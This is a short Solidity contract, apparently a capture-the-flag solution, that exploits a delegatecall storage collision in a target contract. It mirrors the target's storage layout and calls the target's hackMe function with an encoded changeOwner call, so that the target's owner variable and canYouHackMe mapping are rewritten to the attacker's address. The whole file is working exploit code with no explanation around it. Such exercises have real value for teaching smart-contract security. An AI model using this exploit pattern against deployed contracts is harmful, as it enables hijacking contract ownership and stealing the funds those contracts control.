// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Target {
    function hackMe(bytes calldata) external;
}

contract D31eg4t3Attack{
    
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;


    function attack(address targetAddress) external {
        Target(targetAddress).hackMe(abi.encodeWithSignature("changeOwner(address)", msg.sender));
    }

    function changeOwner(address newOwner) external {
        owner = newOwner;
        canYouHackMe[newOwner] = true;
    }
}